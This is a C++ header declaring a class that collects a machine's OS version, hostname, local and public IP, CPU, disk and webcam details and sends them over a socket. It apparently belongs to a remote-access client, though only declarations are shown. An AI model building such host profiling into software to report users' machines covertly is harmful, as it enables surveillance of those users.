#pragma once

//功能操作类
#include "ModuleSocket.h"
#include "Common.h"

class CSystemInfo
{
public:
	CSystemInfo(void);
	~CSystemInfo(void);

	int GetSysVersion(); //获取操作系统版本信息
	void GetHostName(OUT char* hostName, OUT char* szLocalIP, OUT bool* pbSuccess);   //获取操作系统的名称
	void GetInternetIP(OUT char* pWANIP, OUT bool* pbSuccess); //获取公网IP地址
	UINT32 SendSysInfo(IN SOCKET sock, OUT bool* pbSuccess);
	DWORD GetProcessorCoreCount();  //获取CPU的核心数
	DWORD GetCPULevel();  //获取CPU的主频信息
	BOOL IsWebCam();  //是否有摄像头
	DWORD GetTotalDiskInfo();
private:
	CModuleSocket m_moduleSocket;
};
